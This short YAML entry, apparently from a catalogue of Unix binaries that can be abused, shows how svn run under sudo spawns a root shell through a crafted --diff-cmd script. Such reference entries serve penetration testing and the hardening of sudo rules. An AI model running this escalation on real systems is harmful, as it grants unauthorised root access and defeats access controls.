---
functions:
  sudo:
    - code: |
        TD=$(mktemp -d)
        svnadmin create $TD/pwn
        svn checkout file:///$TD/pwn $TD/project
        echo -e '#!/bin/bash\n/bin/sh' > $TD/shell
        chmod +x $TD/shell
        sudo svn diff --diff-cmd "$TD/shell"
---
